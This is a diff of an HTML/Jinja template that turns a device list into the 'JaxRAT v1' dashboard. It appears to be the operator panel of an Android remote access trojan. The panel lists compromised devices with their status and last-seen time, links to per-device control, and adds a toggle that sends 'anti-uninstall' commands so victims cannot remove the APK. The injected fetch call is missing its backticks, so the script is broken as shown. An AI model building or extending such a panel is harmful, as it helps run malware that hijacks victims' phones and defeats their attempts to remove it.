@@ -3,30 +3,56 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Ezax Agent - Daftar Perangkat</title>
+    <title>JaxRAT v1 - Dashboard</title>
     <style>
-        body { background-color: #0a0a0a; color: #00ff00; font-family: 'Courier New', monospace; padding: 50px; }
-        h1 { text-shadow: 0 0 10px #00ff00; text-align: center; }
-        .device-list { max-width: 600px; margin: 0 auto; }
-        .device-item { border: 2px solid #00ff00; padding: 15px 20px; margin-bottom: 15px; display: flex; justify-content: space-between; align-items: center; background-color: #000; box-shadow: 0 0 10px #00ff00 inset; }
-        .status-online { color: #00ff00; font-weight: bold; }
+        body { background-color: #0a0a0a; color: #00ff00; font-family: 'Courier New', monospace; padding: 20px; }
+        .header { display: flex; justify-content: space-between; align-items: center; border-bottom: 2px solid #00ff00; padding-bottom: 10px; margin-bottom: 20px; }
+        h1 { text-shadow: 0 0 10px #00ff00; margin: 0; }
+        .logout { color: #ff0000; text-decoration: none; font-weight: bold; border: 1px solid #ff0000; padding: 5px 10px; border-radius: 5px; }
+        .logout:hover { background: #ff0000; color: #000; }
+        .device-card { border: 2px solid #00ff00; padding: 20px; margin-bottom: 20px; background-color: #050505; box-shadow: 0 0 15px #00ff00 inset; border-radius: 10px; }
+        .device-info { display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px; }
+        .status-online { color: #00ff00; text-shadow: 0 0 5px #00ff00; font-weight: bold; }
         .status-offline { color: #ff0000; font-weight: bold; }
-        .btn { background-color: #000; color: #00ff00; border: 2px solid #00ff00; padding: 10px 20px; text-decoration: none; font-family: inherit; cursor: pointer; transition: 0.3s; }
+        .btn { background-color: #000; color: #00ff00; border: 2px solid #00ff00; padding: 10px 20px; text-decoration: none; font-family: inherit; cursor: pointer; transition: 0.3s; border-radius: 5px; }
         .btn:hover { background-color: #00ff00; color: #000; box-shadow: 0 0 20px #00ff00; }
+        .setting-item { display: flex; justify-content: space-between; align-items: center; background: #111; padding: 10px; border: 1px dashed #00ff00; margin-top: 10px; }
     </style>
 </head>
 <body>
-    <h1>[ DAFTAR PERANGKAT EZAX ]</h1>
-    <div class="device-list">
-        {% for id, info in devices.items() %}
-        <div class="device-item">
-            <div>
-                <strong>{{ info.name }}</strong><br>
-                Status: <span class="status-{{ info.status }}">{{ info.status | upper }}</span>
-            </div>
-            <a href="/device/{{ id }}" class="btn">BUKA KONTROL</a>
-        </div>
-        {% endfor %}
+    <div class="header">
+        <h1>[ JaxRAT v1 - DASHBOARD ]</h1>
+        <a href="/logout" class="logout">LOGOUT</a>
     </div>
+
+    {% for id, info in devices.items() %}
+    <div class="device-card">
+        <div class="device-info">
+            <div>
+                <h2 style="margin: 0 0 5px 0;">{{ info.name }}</h2>
+                <span class="status-{{ info.status }}">Status: {{ info.status | upper }}</span> | <small>Last Seen: {{ info.last_seen }}</small>
+            </div>
+            <a href="/device/{{ id }}" class="btn">BUKA KONTROL ➔</a>
+        </div>
+        
+        <div class="setting-item">
+            <span>🛡️ Anti-Uninstall (Cegah Hapus APK)</span>
+            <label class="switch">
+                <input type="checkbox" {% if info.anti_uninstall %}checked{% endif %} onchange="toggleAntiUninstall('{{ id }}', this.checked)">
+                <span style="color: {% if info.anti_uninstall %}#00ff00{% else %}#ff0000{% endif %}; font-weight:bold;">{% if info.anti_uninstall %}ON{% else %}OFF{% endif %}</span>
+            </label>
+        </div>
+    </div>
+    {% endfor %}
+
+    <script>
+        function toggleAntiUninstall(deviceId, isChecked) {
+            let cmd = isChecked ? "anti_uninstall_on" : "anti_uninstall_off";
+            fetch(/api/command/${deviceId}, {
+                method: 'POST', headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ command: cmd })
+            }).then(() => location.reload());
+        }
+    </script>
 </body>
 </html>
